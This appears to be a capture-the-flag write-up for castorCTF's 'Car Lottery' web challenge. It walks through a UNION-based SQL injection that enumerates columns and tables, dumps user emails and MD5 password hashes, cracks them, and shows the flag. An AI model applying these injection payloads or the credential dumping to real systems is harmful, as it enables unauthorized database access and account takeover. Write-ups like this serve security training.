# ## Car Lottery [WEB- 500 Point ]

> Tsami Team

# ##WRITEUP
The page displays  error messages. So there exists at least five columns.
`/search?id='1' order by 5 -- +`

check the  number of columns that are vulnerable.
`/search?id='1'UNION SELECT 1,2,3,4,5-- + `

check user and current database, and version by replace fucntion 
`http://web1.cybercastors.com:14435/search?id='1'UNION SELECT 1,@@version,database(),user(),5-- + '`


group_concat(), all the column names are diplayed on screen `cars & User`
`http://web1.cybercastors.com:14435/search?id='1'UNION SELECT 1,group_concat(table_name,0x0a),4,3,5 from information_schema.tables where table_schema=database()  -- + '`


fetches all names and passwords from the users table. 0x0a represents a space
`http://web1.cybercastors.com:14435/search?id='1'UNION SELECT 1,group_concat(username,0x0a,password),4,3,5  from Users--+--+'`'`

result : 
`admin@cybercastors.com :cf9ee5bcb36b4936dd7064ee9b2f139e,
admin@powerpuffgirls.com: fe87c92e83ff6523d677b7fd36c3252d,
jeff@homeaddress.com :d1833805515fc34b46c2b9de553f599d
,moreusers@leakingdata.com :77004ea213d5fc71acf74a8c9c6795fb``

Bruteforce MD5 hash Or use Online websites : 

`cf9ee5bcb36b4936dd7064ee9b2f139e : naruto
fe87c92e83ff6523d677b7fd36c3252d : powerpuff
d1833805515fc34b46c2b9de553f599d : pancakes
77004ea213d5fc71acf74a8c9c6795fb : fun`
`

Now we need to bruteforce Admin panel with dirb or any other tools and login as admin 

``flag : castorCTF{daT4B_3n4m_1s_fuN_N_p0w3rfu7}``



